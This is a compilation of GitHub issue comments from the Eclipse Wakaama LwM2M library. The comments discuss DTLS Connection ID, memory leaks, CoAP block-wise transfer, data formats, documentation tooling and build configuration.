In my experience, the very larges part of the power-saving stuff is the Connection ID (DTLS 1.3, RFC 9147 or DTLS 1.2, RFC 6347+DTLS 1.2 Connection ID, RFC9146), which eliminates the massive usage of handshakes caused by ip-address changes after sleeping. RFC9146 is implemented in Eclipse/Californium and Eclipse/tinydtls (feature branch).

Also in my experience, it's not too unimportant, that an implementation works reliable. For both eclipse DTLS 1.2 Connection ID implementations I have in the meantime very good experience with mid/long term runtime stability.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/IC_kwDOASCHpc5Zk4ea/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

just to clarify, DTLS 1.3 is not supported in the mbedTLS development branch (https://github.com/Mbed-TLS/mbedtls/blob/development/library/ssl_tls.c#L1305). It is possible that it is being worked on in a fork but mainline mbedTLS does not yet support DTLS 1.3

As Achim mentioned, RFC 9147 brings DTLS inline with the TLS 1.3 developments. The list of new features in TLS 1.3 (compared to 1.2) is long. At a high-level the benefits are: improved security, better performance, and extra privacy protection. DTLS 1.3 adds extra over-the-wire improvements to TLS 1.3 with a new header format.

Achim mentioned that the Connection ID feature was back-ported from DTLS 1.3 to DTLS 1.2. It significantly improves the energy efficiency of DTLS. The DTLS 1.3 CID version offers extra privacy protection.

Going forward I believe DTLS 1.3 is unavoidable since the IETF TLS working group will continue the standardization of new features, which will only be available for (D)TLS 1.3.

Of course, it takes time to implement the protocols and the protocol extensions. WolfSSL has been leading the development of commercial TLS/DTLS stacks. Congrats to their work. I hope others follow soon.

This is really a collection of items that all help to reduce handshake and data transfers. Only a real world test with functioning libraries can give specific number of this reduction, but from spec's it seem pretty clear it should be more than significant, for sleeping devices with regular wakeups, that also require the highest reliability/connectivity.

As I wrote, if you start to sort the things in DTLS 1.3 / DTLS 1.2 related and others (as CBOR), you will see, that pretty much of the benefits from DTLS 1.3 already comes with DTLS 1.2 CID.

Exactly, therefore I created [zephyr - coaps-client](https://github.com/boaks/zephyr-coaps-client), which demonstrates CoAP/DTLS 1.2 CID using a LTE-M/NB-IoT modem. A [longterm test autumn 2022](https://github.com/boaks/zephyr-coaps-client/blob/main/docu/POWERCONSUMPTION.md#results-of-longterm-tests-using-low-quiescent-current---october-2022-to-february-2023) showed the efficiency and pretty well reliability. That reliability has been improved since that, but 120 days wasn't that bad.  

So, those who like to have a look on what is available may check out DTLS 1.2 CID.
And others may either wait or engage themself.

You are right. Sorry for the confusion. 

The table I showed was originally based on a LwM2M comparison.  So CBOR is not related to DTLS in this context. What is related is that LwM2M >= `v1.2` does use `LwM2M CBOR`, whereas previous versions do not, which indirectly means that any LwM2M with DTLS support >= 1.2, also has LwM2M CBOR. So ignore feature 7 in the table.

This is the [`lwm2m_transaction_t`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/include/liblwm2m.h#L685) struct:
```c
/*
 * LWM2M transaction
 *
 * Adaptation of Erbium's coap_transaction_t
 */

typedef struct _lwm2m_transaction_ lwm2m_transaction_t;

typedef void (*lwm2m_transaction_callback_t) (lwm2m_context_t * contextP, lwm2m_transaction_t * transacP, void * message);

struct _lwm2m_transaction_
{
    lwm2m_transaction_t * next;  // matches lwm2m_list_t::next
    uint16_t              mID;   // matches lwm2m_list_t::id
    void *                peerH;
    uint8_t               ack_received; // indicates, that the ACK was received
    time_t                response_timeout; // timeout to wait for response, if token is used. When 0, use calculated acknowledge timeout.
    uint8_t  retrans_counter;
    time_t   retrans_time;
    void * message;
    uint16_t buffer_len;
    uint8_t * buffer;

        payload_len;  // the length of the entire payload, message payload might be smaller in case of a block1 transfer
    uint8_t *payload; // carries the entire payload across multiple transactions in case of a block 1 transfer
    lwm2m_transaction_callback_t callback;
    void * userData;
};
```
I noticed that the `userData` field is used/allocated by the [`prv_register`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/core/registration.c#L725) function, which is called when the client needs to be registered on the server, in this particular case `userData` is a pointer to another struct ([`registration_data_t`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/core/registration.c#L631)) which contains other pointers (`query` and `payload`) also allocated by the same [`prv_register`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/core/registration.c#L725) function.

The `userData` field is deallocated by the callback `lwm2m_transaction_t::callback` ([`prv_handleRegistrationReply`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/core/registration.c#L638)), this callback is called only when the server responds to the registration message via the [`transaction_handleResponse`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/coap/transaction.c#L287), or when the transaction expires via the [`transaction_send`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/coap/transaction.c#L368) function.

The issue is that if the server does not respond to the connection message or the user decides to quit the client before the server respond, the `userData` field will never be deallocated.

In the [`examples/client/lwm2mclient.c`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/examples/client/lwm2mclient.c) example, the user can quit the client by sending the `quit` command on the STDIN port, in this case the transaction list is deallocated by the [`prv_deleteTransactionList`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/core/liblwm2m.c#L168) called by [`lwm2m_close`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/core/liblwm2m.c#L180) function.
The problem is that [`prv_deleteTransactionList`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/core/liblwm2m.c#L168) does not deallocate the `userData` field of the transactions, actually it cannot deallocate this pointer, because of `void *` type, and this causes the memory leak.

To fix this issue I was thinking of modifying the [`prv_deleteTransactionList`](https://github.com/eclipse/wakaama/blob/snapshots/2023-03-31/core/liblwm2m.c#L168) function by calling the callback:
```c
void prv_deleteTransactionList(lwm2m_context_t * context)
{
    while (NULL != context->transactionList)
    {
        lwm2m_transaction_t * transaction;

        transaction = context->transactionList;
        context->transactionList = context->transactionList->next;
        if(transaction->callback) {
            transaction->callback(context, transaction, NULL);
        }
        transaction_free(transaction);
    }
}
```
But I'm not sure if that's the right way to fix this.

I would like to ask you about support of queue mode in current implementation of Wakaama. Is it currently supported? 
I see that there is a mention about UQ mode in the implementation. 

We have a following situation:
Let's say that after the COAP_MAX_TRANSMIT_TIME (93s) from the last ACK message sent from client to the server, we want to switch the client into SLEEP mode (SSL connection should be cancelled, registration persist). 

Every request that the server sends to the client should be queued because the client is offline.

After some time, the client should be awaken to re-establish the connection with server (most probably the client will be awaken a few seconds before the registration/update). 

There are two possible ways:
1. The client should perform full DTLS handshake for establish the connection.
2. The client should use session resumption for establishing the connection. (improvement in TLS handshake, quicker way)

After re-establishment of connection, the client should receive every request from server that was previously queued during the time when the client was in SLEEP mode.

``` 
Basically I copied the [`prv_deleteServer(...)`](https://github.com/parmi93/wakaama/blob/ceddf224ea787c897ac3cb5bd4ed9defc2bd4c93/core/liblwm2m.c#L91) function.

### Breafly
We can use the following example code, to state that the `lwm2mH->bootstrapServerList->blockData` list is not freed by calling `lwm2m_close(...)` > `prv_deleteBootstrapServerList(...)` > `prv_deleteBootstrapServer(...)`

It's Roman, CTO in the embedded dev team [Sinai RnD](sinai.io).

### Intro
We have wide plans to use the Wakaama Library as the base for the solution we are creating for our Client.
I see several times that people ask questions like ""**Is Wakaama compliant with LWM2M v.1.1** (or v.1.2)?"".

To answer this question we have performed an analysis of the gap between the current Wakaama and LWM2M specification.
I'm happy to share our results with the community and receive feedback.

### Basics
Some considerations:
  - this analysis has a preliminary nature, so mistakes are possible, no guarantees
  - we are focused only on the Wakaama Client and do not know anything about the Server/ Bootstrap Server functionality
  -  Wakaama version under analysis  [11662338](https://github.com/sinai-io/2305-Wakaama/commit/11662338212a8eb36353f42341e9b5d312c90255) 

### How to read the table

The Analysis is formatted as a table. It consists of 2 parts separated by a double vertical border.
The **first part** describes which version of the LWM2M Protocol Wakaama supports (for every LWM2M feature).
The **second part** (see in the comment below) shows the evolution of LWM2M features in different Protocol versions (from the introduction to the current state).

There is a color coding in the table:
   - LWM2M ver.1.0 - grey
   - LWM2M ver.1.1 - yellow
   - LWM2M ver.1.2 - green
   - LWM2M ver.1.2.1 - blue
   -  no support - red
   
### Analysis result
The full table is [accessible in Google Spreadsheets](https://docs.google.com/spreadsheets/d/1NMQXMOR-EZHrENwvd6rKY9UBk8khPqpfQxiyENUalC8/)

**I agree.**

At **Leshan** we put it in **wiki** :

The simple way is to write your documentation in Markdown in your code repository and so you can use default github markdown rendering , Iike with current README. Personally I recommend this way.

If you want to do more (which will be probably more work and not sure if there is more benefits), you can eventually host your documentation in the Wakaama website ? 
- the website : https://eclipse.dev/wakaama/
- the repo of the website : https://github.com/eclipse/wakaama-website

Maybe before to go on that direction, it could make sense to ask some advice to eclipse IT : https://gitlab.eclipse.org/eclipsefdn/helpdesk

   - wiki: more native integration with GitHub infrastructure (e.g. issues), better rendering, collaborative editing 
   - MDown: better tie to the code, easier to maintain, keeps doc inside the repo
   
 Seems wiki **may** be better for Wakaama **users**; while MDown is better for Wakaama **developers**.

Bottom line. 
I vote for **MDown** for now,  as far as we do not have a lot of external users yet. 
If/when the situation changes - we may render MDown-based docs to the Wiki or Web-site or whatever.

I thought Github was only able to  render **markdown**.  :facepalm: 

But Reading : https://www.ericholscher.com/blog/2016/mar/15/dont-use-markdown-for-technical-docs/

> Developers prefer it because GitHub supports it, though GitHub supports [9 different markup languages](https://github.com/github/markup#markups), including [Asciidoc](http://asciidoctor.org/docs/asciidoc-writers-guide/) and [reStructuredText](http://www.sphinx-doc.org/en/stable/rest.html).

So I quickly tested for :
- reStructuredText : https://github.com/sbernard31/leshan/blob/test-markup/test-reStructuredText.rst
- asciidoctor : https://github.com/sbernard31/leshan/blob/test-markup/test-asciidoctor.adoc

And indeed they seem to be (at least partially) supported too :star_struck: .

So I change my recommendation :slightly_smiling_face:  :

I don't know about the tooling and ecosystem around asciidoc.
But Sphinx is well known by a lot of developers and widely used. See the (incomplete) list of projects using Sphinx in the documentation: [Projects using Sphinx](https://www.sphinx-doc.org/en/master/examples.html).
There are also a lot of extensions to Sphinx: tooling, plug-ins, themes...

But I'm not hooked to Sphinx. I can live with other solutions, too. I just feel that Sphinx would be a good solution.
I would also not add a lot of tooling from the beginning. We should just start to document things by adding markup files to the repo. But it would be cool if we could use a documentation tool as soon as we have some documentation pages put together.

Error 4.00 makes sense here, because you try to `exec` on object instead of resource level. Try a resource which has the executable flag, e.g. `exec 0 /1/0/8`.

`write 0 /1/0/1 20` works for me:

Eventually, you could have reopened it but creating a new one is good too. 

> how can we start an election process?

There is a description of the election process at : https://www.eclipse.org/projects/handbook/#elections-how
To start the election : 
 - go to the project page : https://projects.eclipse.org/projects/iot.wakaama
 - log you (if this is not already done)
 - and you should see committer tools on the right (like [this](https://www.eclipse.org/projects/handbook/#pmi-project-page))
 - then just click on : [**Nominate a Committer**](https://projects.eclipse.org/projects/iot.wakaama/nominate/CM)
 
 I just add some more useful link about being a committer : 
 - https://blogs.eclipse.org/post/wayne-beaton/becoming-eclipse-committer
 - https://www.eclipse.org/projects/handbook/#contributing-committers

Yep, this should be done by Eclipse Foundation. (I mean they do that by default when you ask for own organization)

> Does anyone know how that website is deployed?

This is manage by eclipse foundation.
This is  supposed to be a static website. If you change content of main branch then it will automatically be deployed few seconds?/minutes?/hours? later. If you observe that the site is not deployed 1 day later, you can notify eclipse foundation as you probably face a bug/issue.

**TLV** is a binary format so it should be pretty efficient.
In **LWM2M v1.0.x**, it was the only binary format and probably the most used as you can do anything with it and it was mandatory at client and server side.

**LWM2M v1.1.x** [more or less deprecates TLV](https://www.openmobilealliance.org/release/LightweightM2M/V1_1_1-20190617-A/HTML-Version/OMA-TS-LightweightM2M_Core-V1_1_1-20190617-A.html#7-4-0-74-Data-Formats-for-Transferring-Resource-Information) : 
>  LwM2M Clients supporting LwM2M TS 1.1 or newer SHOULD NOT use the legacy TLV or JSON formats.

And introduces **SenML-CBOR** which is based on **CBOR** described as : 
> The Concise Binary Object Representation (CBOR) is a data format whose design goals include the possibility of extremely small code size, fairly small message size, and extensibility without the need for version negotiation

(source : [RFC8949 § Abstract](https://www.rfc-editor.org/rfc/rfc8949#abstract))

So I guess it should be pretty efficient too but I don't know compare to **TLV**
I suppose that authors add this format because this is an IETF standard (See [RFC8428](https://datatracker.ietf.org/doc/html/rfc8428)) contrary to **TLV** which is LWM2M only ?
(It also seems that [**SenML-CBOR** support timestamped value](https://github.com/OpenMobileAlliance/OMA_LwM2M_for_Developers/issues/538#issuecomment-1010149277) but don't know if this is supported by Wakaama)

But the funny part, in **LWM2M v1.2.x** , authors introduce another format called[ **LwM2M CBOR**](https://www.openmobilealliance.org/release/LightweightM2M/V1_2_1-20221209-A/HTML-Version/OMA-TS-LightweightM2M_Core-V1_2_1-20221209-A.html#7-5-4-0-754-LwM2M-CBOR) which is suppose to be more efficient but is NOT an IETF standard and WITHOUT timestamped value support ... (probably not supported by Wakaama because if I remember well Wakaama is about LWM2M v1.1.x )

I suppose yes that CBOR is efficient too, I will compare the data part when doing a read with TLV and a send with senml CBOR. I am doing tests with Wireshark/tcpdump on client side to evaluate data usage between formats
Actually I would like to use LWM2M for embedded systems to send binary payloads most of the time ... so I was looking for something efficient !!

I hope the LWM2M standards will converge with something supported by many constructors. Today I am using Wakaama but in the final commercial product maybe we will use the embedded LWM2M stack from modem ...

Hard to say but maybe you behind NAT and so from a Server point of view your client IP changes and so you need to do an update ?

I encountered an issue where the client SEND operation does not use the existing fragmentation logic implemented for server WRITE operation. This results in the creation of oversized CoAP packet when large payloads are sent, which the server then rejects due to exceeding the maximum packet size limit. 

## Steps to Reproduce
1. Start the server and example client.
2. Add a new resource that exceeds the 2048 byte limit.
3. Attempt to send the resource from the client using the SEND method (lwm2m_send).
4. Observe that the payload is not fragmented and is sent in a single large CoAP packet.

## Expected Behavior
The client SEND operation should fragment large payloads into multiple CoAP packets, similar to how the server-side WRITE operation handles them.

## Possible Fix
The issue can be resolved by utilizing the _transaction_set_payload_ method in the _lwm2m_send_ method, similar to its usage in the server WRITE operation, instead of the currently used _coap_set_payload_.

The `senml_json_serialize` function uses a statically allocated buffer (`uint8_t bufferJSON[PRV_JSON_BUFFER_SIZE];`), which may not be sufficient for operations involving multiple resources or large data sets, for example reading an object with multiple instances.

**Issue**
If the serialized data exceeds the `PRV_JSON_BUFFER_SIZE`, serialization failures occur, affecting the ability of the protocol to efficiently handle larger or multiple resource transmissions.

**Suggested Enhancement**
Consider implementing dynamic buffer allocation or a more flexible buffer management strategy to accommodate varying payload sizes, enabling robust and scalable data management according to LwM2M specifications.

Would appreciate further insights or suggestions on this approach.

This is due to a missing `const` keyword on the `uint8_t * buffer`. Once that is changed, I'm able to compile but the samples don't handle the full block transfer and would need some updates to complete a transfer.

You can try to use the cmake presets to build. This is unfortunately not documented yet.
```
$ cmake --preset client
$ cmake --build --preset client
```
Then you can find the client executables in `build-presets/client/examples/client`. This will also build some unittests. The same works for the server. You can also list the available cmake presets.
```
$ cmake --build --list-presets

This ensures that the library is modular and easier to maintain and extend.

# Layered Architecture

![wakaama_layers](https://github.com/user-attachments/assets/6cd2771e-ba03-452a-904b-1f0441e12203)

Each layer is allowed to access code from itself and all layers below it (the layers are open). But it is not allowed to access code from higher layers.

## Support Layer

This forms the basis for the library and supports an abstraction to the environment. They are necessary for the functionality of the library, but cannot be implemented in a generic way.

Abstractions in this layer include:
* OS (Platform)
* Transport (TLS, dTLS, ...)
* Event Loop (`select`, `epoll`, ...)

Customization in this layer is mainly achieved by link-time polymorphism:
For example, a POSIX platform module implements the set of functions declared in `platform.h` and is linked to the library. Another module for and embedded system would implement the same functions. But only one of these modules are linked to the final library.

## Base Layer

This layer contains the core LwM2M functionality.

Customization in this layer is done with conditional compilation (`#ifdef`s). 

## Add On's Layer

This layer includes additional functionality, that might be useful for some application, but that can be omitted for others. This might include modules for:
* Command Line Interface (CLI)
* IPSO Object Registry

Modules from this layer can be added with the build system (CMake).

# Folder Structure

The folder structure should reflect the architecture layers.

![wakaama_folders](https://github.com/user-attachments/assets/04181a3a-ce1e-41a2-8cc0-d2b0b4dad96c)

With a nice folder structure and a correct build system, some architectual rules can be enfored (i.e. no circular dependencies, accessing only lower layers).

I have a memory limited device and want to retrieve a large amount of data via a ""single"" read/GET request.

To be more specific: I am trying to download a trace buffer (64kBytes in size) from an embedded device. For this I want to use object ID 20 (Log Event).

For this I wanted to use raw block-wise transfer which is working perfectly fine for Write Requests to the Device (firmware Update).
But it looks like it does not work for read/GET requests.

Is this expected to be supported by wakaama in any way? As far as I can see the client tries to malloc() the required amount of memory for the whole response (which is impossible on my device). It is also not possible to somehow indicate that the response must be done in a blockwise manner.

So I am currently trying to implement this on my own, but I am a little bit confused. Regarding who is initating the blockwise transfer in this case.

According to RFC 7959 (https://www.rfc-editor.org/rfc/rfc7959#section-2.1) a blockwise transfer from the Server should be done with BLOCK1 option for the GET request and the client responds with BLOCk2 responses.

- Should the Server at all indicate via BLOCK1 that it expects the read/GET to be done via blockwise transfer
- or should the Client automatically respond with BLOCK2 if the response is larger then the CHUNK_SIZE

As far as I understand section 2.3 of the RFC, the responder (in this case the Client) should automatically respond with BLOCK2 indicating that the response comes in blocks.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/807/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Maybe obvious but just in case, **some clarification :** 

`BLOCK1` is about transferring large **payload** in a **request** (e.g. PUT or POST)
`BLOCK2`  is about transferring large **payload** in a **response** (e.g. GET)

In **CoAP** : 
 - the client is the peer sending the request
 - the server is the peer sending the response.

LWM2M client act as a CoAP client (e.g. register operation) but also as a CoAP server. (e.g. write operation) 
This is also true for the LWM2M server.

So better to always prefix client/server by LWM2M or CoAP to avoid confusion. 

In case of a LWM2M Read Request (CoAP GET request). LWM2M server acts as a CoAP client. LWM2M client as a CoAP server.

As you want to transfer a large payload of a response of CoAP GET request, `BLOCK2` should be used.

> Should the Server at all indicate via BLOCK1 that it expects the read/GET to be done via blockwise transfer

No, in that case you should not use `BLOCK1`.
But a CoAP client (in that case LWM2M server) can use `BLOCK2` in the initial request to express the preferred block size :   
> To influence the block size used in a response, the requester MAY
   also use the Block2 Option on the initial request, giving the desired
   size, a block number of zero and an M bit of zero.  A server MUST use
   the block size indicated or a smaller size.

(source  : https://www.rfc-editor.org/rfc/rfc7959#section-2.4)

> or should the Client automatically respond with BLOCK2 if the response is larger then the CHUNK_SIZE

This is the common case but we see just above that the CoAP client also can ask for block2 transfer giving a small block size.

The first observe will then send a notification with the token of the second observe. The reason for mixing up observes is an insufficient URI match check in prv_findObserved().

I fixed this by changing findObserved() in observe.c to explicitly check that each observe-level is set both in new and existing observe, or unset in both. Otherwise, the entries are considered non-matching.

The function with changes:

static lwm2m_observed_t * prv_findObserved(lwm2m_context_t * contextP,
                                           lwm2m_uri_t * uriP)

I don't want to have a dependency on CUnit because I won't be able to run the tests after building them (because is cross platform compilation) and I'm constrained in memory and storage space.
If I remove  add_subdirectory(tests) from CMakelists.txt everything works fine for me, but I can't modify any file in the Wakaama directory because is a dependency as a submodule in git.

Would it be possible to have a CMake variable that removes the unit tests from the build? Something like set(WAKAAMA_TESTS OFF) that I can include in my client code CMakelists.txt 

Or alternatively, create a wakaama_lib directory and build the library alone and have a different directory for the complete build with the tests?

Thank you!","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/844/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"
